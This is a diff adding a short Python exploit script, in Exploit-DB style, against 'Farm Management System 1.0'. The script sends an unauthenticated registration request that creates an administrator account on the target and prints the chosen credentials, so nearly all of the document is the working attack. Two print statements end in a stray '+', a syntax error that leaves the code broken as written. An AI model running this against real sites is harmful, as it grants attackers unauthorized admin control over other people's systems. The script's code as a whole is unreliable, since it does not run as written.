@@ -1,0 +1,18 @@
+# Exploit Title: Farm Management System 1.0 - Remote Add Admin
+# Google Dork: None
+# Date: n/a
+# Exploit Author: Or4nG.M4n
+# Software Link: https://www.sourcecodester.com/sites/default/files/download/oretnom23/Redcock-Farm.zip
+# Version: 1.0
+
+import requests 
+print ("FARM EXploit - Az7rb & Or4ng\n")
+email = input("Email : ")
+user = input("user : ")
+pas  = input("password : ")
+postdata = {'dignity':'Admin','fullname':user,'lastname':'lastname','username':user,'password':pas,'confirmpassword':pas,'staffid':'1','signup':'Register','emailid':email,'mobileno':'05554444'}
+resp = requests.post("http://localhost/farm/newuser_form.php", postdata)
+print("+")
+print("| [+] username : "+user+)
+print("| [+] password : "+pas+)
+print("+")
